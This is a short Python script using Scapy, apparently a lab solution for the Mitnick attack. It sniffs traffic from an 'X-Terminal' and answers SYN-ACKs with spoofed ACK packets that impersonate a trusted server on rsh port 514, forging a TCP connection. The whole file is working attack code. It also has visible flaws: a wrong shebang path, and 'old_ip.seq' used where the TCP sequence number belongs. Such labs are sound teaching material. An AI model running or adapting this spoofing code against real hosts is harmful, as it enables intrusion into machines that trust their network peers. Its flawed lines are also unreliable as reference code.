#!/user/bin/python3
from scapy.all import*

x_ip = "192.168.12.5" #X-terminal IP
x_port = 514 #Port number used by X-Terminal

srv_ip = "192.168.12.6" #The Trusted Server IP
srv_port = 1023 #Port number used by the Trusted Server 


def spoof_pkt(pkt):
	Seq=123456789 + 1
	old_ip=pkt[IP]
	old_tcp=pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 
	print ("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))


	#if TCP flag recieved is SYN-ACK, respond with an ACK flag. 
	if old_tcp.flags=="SA":
		print("sending spoofed ACK packet to the X-Terminal (Victim)")
		ip=IP(src=srv_ip,dst=x_ip)
		tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

pkt=sniff(filter="tcp and src host 192.168.12.5", prn=spoof_pkt) 




